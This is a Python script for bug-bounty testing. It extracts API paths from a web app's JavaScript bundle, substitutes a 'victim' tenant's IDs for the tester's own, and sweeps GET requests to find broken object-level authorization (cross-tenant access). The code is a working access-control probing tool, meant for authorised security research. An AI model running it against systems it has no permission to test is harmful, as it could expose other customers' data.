#!/usr/bin/env python3
"""Tenant-substitution BOLA sweep, driven by the admin SPA bundle.

Turns "hunt for cross-tenant access" into a mechanical matrix:
  1. extract every API path the vendor's own client knows (template literals)
  2. substitute YOUR tenant ids -> VICTIM tenant ids
  3. sweep GET-only, bucket by status
  4. auto-diff every 200 against the same path on YOUR tenant (global vs cross-tenant)

Verified on a DTC payments platform 2026-10: 13.5 MB bundle -> 389 paths -> 352 tenant-scoped
-> 240x 403, 3 false-positive 200s correctly demoted to "global template", 0 findings.

Usage
  python tenant_sweep_from_bundle.py extract  --bundle dash.js --prefix /v1 --out paths.json
  python tenant_sweep_from_bundle.py sweep    --paths paths.json \
      --base https://dashboard-api.example.com/dashboard --token "$TOK" \
      --own-company com_AAA --own-game gm_AAA --victim-company com_BBB --victim-game gm_BBB \
      --out sweep.json [--include-admin]

Notes
  * GET only. Writes need a role you probably do not have; see SKILL.md 9 ("role is the other axis").
  * Placeholder for every non-tenant {param} is a fixed junk token, never a guessable real id
    (identifier guessing is explicitly out of scope on most programs).
  * --include-admin runs /v1/admin/... too (usually 403 everywhere; run it second, not first).
"""

import argparse
import hashlib
import json
import re
import sys
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
JUNK = "aaBBccDDeeFF"


# ---------------------------------------------------------------- extract
def cmd_extract(args):
    src = open(args.bundle, encoding="utf-8", errors="replace").read()
    # Template literals are what codegen'd clients emit. Plain-string regexes miss them entirely.
    backtick = set(re.findall(r"`(" + re.escape(args.prefix) + r"/[^`]{2,140})`", src))
    quoted = set(re.findall(r"""["'](""" + re.escape(args.prefix) + r"""/[^"'`]{2,140})["']""", src))
    paths = sorted(p for p in (backtick | quoted) if " " not in p and "//" not in p)
    scoped = [p for p in paths if "{company_id}" in p or "{game_id}" in p]
    json.dump({"all": paths, "scoped": scoped}, open(args.out, "w"), indent=1)
    print(f"bundle {len(src):,} bytes -> {len(paths)} paths "
          f"({len(backtick)} backtick / {len(quoted)} quoted), {len(scoped)} tenant-scoped")
    print(f"wrote {args.out}")


# ---------------------------------------------------------------- sweep
def _req(url, token, extra_headers):
    h = {"User-Agent": UA, "Accept": "application/json", "X-Bug-Bounty": args_email()}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if extra_headers:
        h.update(extra_headers)
    r = urllib.request.Request(url, headers=h, method="GET")
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:
            return e.code, b""
    except Exception as e:                                    # noqa: BLE001
        return None, str(e).encode()[:200]


_EMAIL = ""


def args_email():
    return _EMAIL or "bugbounty-research"


def build(tmpl, company, game):
    p = tmpl.replace("{company_id}", company).replace("{game_id}", game)
    return re.sub(r"\{[a-zA-Z_]+\}", JUNK, p)


def norm(body):
    """Hash a JSON body with ids/timestamps normalised, so two tenants' GLOBAL data compares equal."""
    try:
        obj = json.loads(body)
    except Exception:                                          # noqa: BLE001
        return hashlib.md5(body).hexdigest()
    if isinstance(obj, dict) and "data" in obj and isinstance(obj["data"], list):
        obj = obj["data"]
    return hashlib.md5(json.dumps(obj, sort_keys=True).encode()).hexdigest()


def cmd_sweep(args):
    global _EMAIL
    _EMAIL = args.bug_bounty_header or ""
    paths = json.load(open(args.paths))
    tmpls = paths["scoped"] if isinstance(paths, dict) else paths
    if not args.include_admin:
        tmpls = [t for t in tmpls if not t.startswith("/v1/admin")]

    jobs = [(t, build(t, args.victim_company, args.victim_game)) for t in tmpls]
    out = []

    def work(job):
        tmpl, path = job
        extra = {}
        if args.send_tenant_headers:
            extra = {"X-Company-Id": args.victim_company, "X-Game-Id": args.victim_game}
        code, body = _req(args.base + path, args.token, extra)
        return {"template": tmpl, "path": path, "status": code,
                "len": len(body), "hash": norm(body) if code == 200 else None,
                "snippet": body[:180].decode("utf-8", "replace")}

    with ThreadPoolExecutor(max_workers=args.concurrency) as ex:
        for row in ex.map(work, jobs):
            out.append(row)

    # ---- diff every 200 against MY OWN tenant: identical body => global/by-design, not cross-tenant
    for row in out:
        if row["status"] != 200:
            continue
        own_path = build(row["template"], args.own_company, args.own_game)
        code, body = _req(args.base + own_path, args.token, None)
        row["own_status"] = code
        row["own_hash"] = norm(body) if code == 200 else None
        row["verdict"] = ("GLOBAL/by-design (identical on own tenant)" if code == 200
                          and row["own_hash"] == row["hash"]
                          else "CROSS-TENANT CANDIDATE" if code == 200
                          else "INCONCLUSIVE (own tenant not 200)")

    json.dump(out, open(args.out, "w"), indent=1)

    counts = {}
    for r in out:
        counts[r["status"]] = counts.get(r["status"], 0) + 1
    print("status buckets:", dict(sorted(counts.items(), key=lambda kv: str(kv[0]))))
    print("\n-- 200s / candidates --")
    for r in out:
        if r["status"] == 200 or (isinstance(r["status"], int) and r["status"] < 300):
            print(f"  {r['status']} {r['path']}\n      own={r.get('own_status')} "
                  f"verdict={r.get('verdict')}  {r['snippet'][:90]}")
    print(f"\nwrote {args.out}")
    print("REMINDER: 200 is a candidate, not a finding. Escalate only CROSS-TENANT CANDIDATE rows, "
          "and never report a body that is identical on your own tenant.")


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    e = sub.add_parser("extract")
    e.add_argument("--bundle", required=True)
    e.add_argument("--prefix", default="/v1")
    e.add_argument("--out", default="paths.json")
    e.set_defaults(func=cmd_extract)

    s = sub.add_parser("sweep")
    s.add_argument("--paths", required=True)
    s.add_argument("--base", required=True, help="e.g. https://api.t/dashboard  (no trailing slash)")
    s.add_argument("--token", required=True)
    s.add_argument("--own-company", required=True)
    s.add_argument("--own-game", required=True)
    s.add_argument("--victim-company", required=True)
    s.add_argument("--victim-game", required=True)
    s.add_argument("--out", default="sweep.json")
    s.add_argument("--concurrency", type=int, default=6,
                   help="keep <=6; parallel fuzzing on one estate draws WAF 1015")
    s.add_argument("--include-admin", action="store_true")
    s.add_argument("--send-tenant-headers", action="store_true",
                   help="also send X-Company-Id/X-Game-Id (tests header-trust instead of path trust)")
    s.add_argument("--bug-bounty-header", default="",
                   help="value for X-Bug-Bounty if the program asks you to identify your traffic")
    s.set_defaults(func=cmd_sweep)

    a = ap.parse_args()
    a.func(a)


if __name__ == "__main__":
    sys.exit(main())
